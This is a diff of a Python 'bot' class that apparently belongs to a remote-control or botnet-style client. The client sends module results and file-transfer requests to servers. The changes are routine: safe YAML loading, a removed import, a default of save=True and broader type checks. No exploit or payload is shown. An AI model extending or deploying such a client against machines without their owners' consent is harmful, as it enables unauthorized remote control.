@@ -1,5 +1,3 @@
-# -*- coding: UTF-8 -*-
-
 from requests.packages.urllib3 import disable_warnings
 import requests
 import os
@@ -10,7 +8,7 @@ import copy
 import inspect
 from http.server import ThreadingHTTPServer, BaseHTTPRequestHandler
 from subprocess import Popen, PIPE, STDOUT
-from yaml import dump, load
+from yaml import safe_dump as dump, safe_load as load
 from tempfile import gettempdir
 from hashlib import sha512
 from secrets import token_urlsafe
@@ -34,7 +32,6 @@ from utils.sys_utils import set_proxy
 
 from modules.UI import rename_order
 from modules.Ciphers import POO_RSA
-from modules.Connections import convex
 from modules.Connections import portforwardlib
 
 # Configuración
@@ -546,7 +543,7 @@ class bot(object):
 
                     self.send(('resultModule', (name, moduleResult, function, exceptionResult)), [url])
 
-    def download(self, filename, outname, save=False):
+    def download(self, filename, outname, save=True):
 
         raw_data = {}
         result = self.send(('RECV-FILE', filename))
@@ -740,7 +737,7 @@ class bot(object):
 
         result = {}
 
-        if not (isinstance(server, list)):
+        if not (isinstance(server, (tuple, list))):
 
             servers = self.servers
 
@@ -786,7 +783,7 @@ class bot(object):
 
     def send(self, string, server=None):
 
-        if not (isinstance(string, tuple) == True):
+        if not (isinstance(string, (tuple, list)) == True):
 
             raise TypeError('El tipo de dato de los datos a enviar no son correctos.')
 
